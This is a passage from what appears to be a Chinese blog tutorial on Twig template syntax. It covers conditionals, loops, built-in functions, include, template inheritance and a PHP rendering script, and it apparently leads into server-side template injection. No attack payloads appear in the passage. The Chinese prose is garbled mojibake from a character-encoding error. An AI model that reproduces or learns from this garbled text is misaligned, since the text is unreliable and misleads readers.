<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span> temperature &gt; <span class="number">30</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ¥µ é«˜æ¸©é¢„è­¦ï¼</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">elseif</span> temperature &lt; <span class="number">5</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ¥¶ ä½æ¸©è­¦æŠ¥ï¼</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸŒ¤ï¸ å¤©æ°”èˆ’é€‚</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="å¤åˆæ¡ä»¶"><a href="#å¤åˆæ¡ä»¶" class="headerlink" title="å¤åˆæ¡ä»¶"></a>å¤åˆæ¡ä»¶</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span> user.isLoggedIn and user.role == <span class="string">&#x27;admin&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ‘‘ æ¬¢è¿ç®¡ç†å‘˜ </span><span class="template-variable">&#123;&#123; user.name &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">elseif</span> user.isLoggedIn <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ‘‹ æ¬¢è¿å›æ¥ </span><span class="template-variable">&#123;&#123; user.name &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ”’ è¯·å…ˆç™»å½•</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="ç©ºå€¼æ ¡éªŒ"><a href="#ç©ºå€¼æ ¡éªŒ" class="headerlink" title="ç©ºå€¼æ ¡éªŒ"></a>ç©ºå€¼æ ¡éªŒ</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">if</span> comments is empty <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ˜ è¿˜æ²¡æœ‰è¯„è®º</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="å¾ªç¯æ§åˆ¶-for-å¾ªç¯"><a href="#å¾ªç¯æ§åˆ¶-for-å¾ªç¯" class="headerlink" title="å¾ªç¯æ§åˆ¶ (for å¾ªç¯)"></a>å¾ªç¯æ§åˆ¶ (<code>for</code> å¾ªç¯)</h5><h6 id="éå†æ•°ç»„"><a href="#éå†æ•°ç»„" class="headerlink" title="éå†æ•°ç»„"></a>éå†æ•°ç»„</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> user <span class="keyword">in</span> users <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123; loop.index &#125;&#125;</span><span class="language-xml">. </span><span class="template-variable">&#123;&#123; user.name &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>âš ï¸ æ²¡æœ‰ç”¨æˆ·æ•°æ®<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><code>loop.index</code> ä»1å¼€å§‹çš„è®¡æ•°</li>
<li><code>loop.index0</code> ä»0å¼€å§‹çš„è®¡æ•°</li>
<li><code>loop.first</code> æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ </li>
<li><code>loop.last</code> æ˜¯å¦æ˜¯æœ€åä¸€ä¸ªå…ƒç´ </li>
</ul>
</blockquote>
<h6 id="éå†å…³è”æ•°ç»„"><a href="#éå†å…³è”æ•°ç»„" class="headerlink" title="éå†å…³è”æ•°ç»„"></a>éå†å…³è”æ•°ç»„</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> key, value <span class="keyword">in</span> settings <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; key &#125;&#125;</span><span class="language-xml">: </span><span class="template-variable">&#123;&#123; value &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="é™å®šå¾ªç¯èŒƒå›´"><a href="#é™å®šå¾ªç¯èŒƒå›´" class="headerlink" title="é™å®šå¾ªç¯èŒƒå›´"></a>é™å®šå¾ªç¯èŒƒå›´</h6>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# åªæ˜¾ç¤ºå‰3æ¡æ–°é—» #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> news <span class="keyword">in</span> newsList<span class="punctuation">|</span><span class="keyword">slice</span>(0, <span class="number">3</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; news.title &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="å¾ªç¯-æ¡ä»¶ç»„åˆ"><a href="#å¾ªç¯-æ¡ä»¶ç»„åˆ" class="headerlink" title="å¾ªç¯ + æ¡ä»¶ç»„åˆ"></a>å¾ªç¯ + æ¡ä»¶ç»„åˆ</h5>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> product <span class="keyword">in</span> products if product.stock &gt; 0 <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    âœ… </span><span class="template-variable">&#123;&#123; product.name &#125;&#125;</span><span class="language-xml"> (åº“å­˜: </span><span class="template-variable">&#123;&#123; product.stock &#125;&#125;</span><span class="language-xml">)</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">else</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    ğŸ˜¥ æ‰€æœ‰å•†å“å·²å”®ç½„</span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="å®Œæ•´ç¤ºä¾‹"><a href="#å®Œæ•´ç¤ºä¾‹" class="headerlink" title="å®Œæ•´ç¤ºä¾‹"></a>å®Œæ•´ç¤ºä¾‹</h5><p>â€‹	ä»¥ä¸‹æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼š</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# æ¨¡æ‹Ÿæ•°æ® #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">set</span> users = [</span><br><span class="line">    &#123;name: <span class="string">&#x27;å¼ ä¸‰&#x27;</span>, role: <span class="string">&#x27;user&#x27;</span>&#125;,</span><br><span class="line">    &#123;name: <span class="string">&#x27;æå››&#x27;</span>, role: <span class="string">&#x27;admin&#x27;</span>&#125;,</span><br><span class="line">    &#123;name: <span class="string">&#x27;ç‹äº”&#x27;</span>, role: <span class="string">&#x27;editor&#x27;</span>&#125;</span><br><span class="line">] <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="comment">&#123;# å¸¦æ¡ä»¶çš„å¾ªç¯ #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> user <span class="keyword">in</span> users <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; loop.index &#125;&#125;</span><span class="language-xml">. </span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123; user.name<span class="punctuation">|</span><span class="keyword">upper</span> &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;%</span> <span class="name">if</span> user.role == <span class="string">&#x27;admin&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            (ç®¡ç†å‘˜)</span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h5 id="ç‰¹æ®Šå¾ªç¯æ§åˆ¶"><a href="#ç‰¹æ®Šå¾ªç¯æ§åˆ¶" class="headerlink" title="ç‰¹æ®Šå¾ªç¯æ§åˆ¶"></a>ç‰¹æ®Šå¾ªç¯æ§åˆ¶</h5>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡º0åˆ°10 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> letter <span class="keyword">in</span> <span class="string">&#x27;a&#x27;</span>..<span class="string">&#x27;z&#x27;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; letter &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡ºaåˆ°z #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h4><p>â€‹	åœ¨Twigä¸­å­˜åœ¨ä¸€äº›å†…ç½®å‡½æ•°ï¼Œå¦‚ç”Ÿæˆåºåˆ—(<code>range</code>)ï¼Œæ—¥æœŸ(<code>data</code>)ã€‚</p>
<h5 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> i <span class="keyword">in</span> <span class="name">range</span>(<span class="number">1</span>, <span class="number">5</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; i &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡ºï¼š1 2 3 4 5 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">for</span> letter <span class="keyword">in</span> <span class="name">range</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>) <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; letter &#125;&#125;</span><span class="language-xml"> </span><span class="comment">&#123;# è¾“å‡º a åˆ° z #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="å¼•å…¥å…¶ä»–æ¨¡æ¿"><a href="#å¼•å…¥å…¶ä»–æ¨¡æ¿" class="headerlink" title="å¼•å…¥å…¶ä»–æ¨¡æ¿"></a>å¼•å…¥å…¶ä»–æ¨¡æ¿</h4><p>â€‹	Twig æä¾›çš„ <code>include</code>å‡½æ•°å¯ä»¥ä½¿ä½ æ›´æ–¹ä¾¿åœ°åœ¨æ¨¡æ¿ä¸­å¼•å…¥æ¨¡æ¿ï¼Œå¹¶å°†è¯¥æ¨¡æ¿å·²æ¸²æŸ“åçš„å†…å®¹è¿”å›åˆ°å½“å‰æ¨¡æ¿</p>

<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123; <span class="name">include</span>(<span class="string">&#x27;other.html&#x27;</span>) &#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h4><p>â€‹	Twigæœ€å¼ºå¤§çš„éƒ¨åˆ†æ˜¯æ¨¡æ¿ç»§æ‰¿ã€‚æ¨¡æ¿ç»§æ‰¿å…è®¸æ‚¨æ„å»ºä¸€ä¸ªåŸºæœ¬çš„â€œskeletonâ€æ¨¡æ¿ï¼Œè¯¥æ¨¡æ¿åŒ…å«ç«™ç‚¹çš„æ‰€æœ‰å…¬å…±å…ƒç´ å¹¶å®šä¹‰å­æ¨¡ç‰ˆå¯ä»¥è¦†å†™çš„ blocks å—ã€‚</p>
<p>â€‹	ä¸ºä¾¿äºç†è§£ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºç¡€æ¨¡æ¿ç»§æ‰¿ï¼ˆç»å…¸ä¸‰æ˜æ²»ç»“æ„ï¼‰çš„ç¤ºä¾‹ï¼š</p>
<h5 id="çˆ¶æ¨¡æ¿base-html-twig"><a href="#çˆ¶æ¨¡æ¿base-html-twig" class="headerlink" title="çˆ¶æ¨¡æ¿base.html.twig"></a>çˆ¶æ¨¡æ¿<code>base.html.twig</code></h5>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><span class="template-tag">&#123;%</span> <span class="name">block</span> title <span class="template-tag">%&#125;</span><span class="language-xml">title</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> styles <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> header <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>head<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> content <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">block</span> footer <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>Â© 2023 mywebsite<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>â€‹	åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>block</code> æ ‡ç­¾å®šä¹‰äº† 5 ä¸ªå—ï¼Œå¯ä»¥ç”±å­æ¨¡ç‰ˆè¿›è¡Œå¡«å……ã€‚å¯¹äºæ¨¡æ¿å¼•æ“æ¥è¯´ï¼Œæ‰€æœ‰çš„ <code>block</code> æ ‡ç­¾éƒ½å¯ä»¥ç”±å­æ¨¡ç‰ˆæ¥è¦†å†™è¯¥éƒ¨åˆ†ã€‚</p>
<h5 id="å­æ¨¡æ¿page-html-twig"><a href="#å­æ¨¡æ¿page-html-twig" class="headerlink" title="å­æ¨¡æ¿page.html.twig"></a>å­æ¨¡æ¿<code>page.html.twig</code></h5>
<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">extends</span> <span class="string">&quot;base.html.twig&quot;</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">block</span> title <span class="template-tag">%&#125;</span><span class="language-xml">about us - </span><span class="template-variable">&#123;&#123; <span class="name">parent</span>() &#125;&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">block</span> styles <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;&#123; <span class="name">parent</span>() &#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/about.css&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">block</span> content <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>introduction<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>There is introduction about our company<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endblock</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	å…¶ä¸­çš„ <code>extends</code> æ ‡ç­¾æ˜¯å…³é”®æ‰€åœ¨ï¼Œå…¶å¿…é¡»æ˜¯æ¨¡æ¿çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾ã€‚ <code>extends</code> æ ‡ç­¾å‘Šè¯‰æ¨¡æ¿å¼•æ“å½“å‰æ¨¡æ¿æ‰©å±•è‡ªå¦ä¸€ä¸ªçˆ¶æ¨¡æ¿ï¼Œå½“æ¨¡æ¿å¼•æ“è¯„ä¼°ç¼–è¯‘è¿™ä¸ªæ¨¡æ¿æ—¶ï¼Œé¦–å…ˆä¼šå®šä½åˆ°çˆ¶æ¨¡æ¿ã€‚</p>
<h5 id="PHPè„šæœ¬page-php"><a href="#PHPè„šæœ¬page-php" class="headerlink" title="PHPè„šæœ¬page.php"></a>PHPè„šæœ¬<code>page.php</code></h5><p>â€‹	ä½¿ç”¨å¦‚ä¸‹PHPè„šæœ¬è°ƒç”¨æ¨¡æ¿</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// å¼•å…¥ Twig è‡ªåŠ¨åŠ è½½å™¨</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ­£ç‚¹ 1ï¼šä½¿ç”¨æ­£ç¡®çš„æ–‡ä»¶ç³»ç»ŸåŠ è½½å™¨ç±»</span></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">Twig_Loader_Filesystem</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/templates&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ­£ç‚¹ 2ï¼šä½¿ç”¨å®Œæ•´ç±»åå®ä¾‹åŒ–ç¯å¢ƒ</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="variable">$loader</span>, [</span><br><span class="line">    <span class="string">&#x27;auto_reload&#x27;</span> =&gt; <span class="literal">true</span> <span class="comment">// å¼€å‘æ¨¡å¼å»ºè®®å¼€å¯</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸²æŸ“æ¨¡æ¿ï¼ˆç¡®ä¿ templates/page.html.twig æ–‡ä»¶å­˜åœ¨ï¼‰</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;page.html.twig&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>â€‹	è®¿é—®åæ¸²æŸ“ç»“æœå¦‚ä¸‹</p>
<p><img src="/img/PHP-ssti-Twig/image-20250227113019832.png" alt="image-20250227113019832"></p>
<p>â€‹	</p>
<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>â€‹	ä»<a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/tree/v1.16.1%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%88%B0PHPstudy%E7%9A%84WWW%E7%9B%AE%E5%BD%95%E7%9A%84%E5%90%8C%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E8%AE%A9%E4%BB%96%E8%A7%A3%E6%9E%90%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/twigphp/Twig/tree/v1.16.1ä¸­ä¸‹è½½æºç åè§£å‹åˆ°PHPstudyçš„WWWç›®å½•çš„åŒä¸€çº§ç›®å½•ä¸‹ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªç½‘ç«™è®©ä»–è§£æï¼Œå…·ä½“è®¾ç½®å¦‚ä¸‹ï¼š</a></p>
<p><img src="/img/PHP-ssti-Twig/image-20250226200703760.png" alt="image-20250226200703760"></p>
